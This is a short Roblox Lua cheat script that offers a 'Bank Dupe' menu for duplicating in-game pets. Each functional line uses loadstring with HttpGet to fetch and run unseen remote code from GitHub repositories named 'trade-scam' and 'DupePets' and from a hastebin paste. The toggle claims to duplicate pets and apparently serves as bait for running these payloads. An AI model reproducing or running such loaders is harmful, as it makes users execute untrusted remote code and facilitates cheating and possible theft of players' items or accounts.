local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/trade-scam/main/trade-scam-loader.lua"))() loadstring(game:HttpGet("https://raw.githubusercontent.com/KoxHacker/DupePets/dd033c4447b9bef9cc8058ddd2c2a12dd585cade/DupePets",true))();
local Window = Library.CreateLib("Bank Dupe", "DarkTheme")

--Dupe
local Trade = Window:NewTab("Bank")
local ScamSection = Trade:NewSection("Dupe")


ScamSection:NewToggle("Dupe", "Put Pet are bank and wait 1 day", function(state)
    if state then
        _G.Key = 418409520
        loadstring(game:HttpGet("https://hastebin.app/raw/626c2b78d3810c001cf24b08"))()
    else
        print("Toggle Off")
    end
end)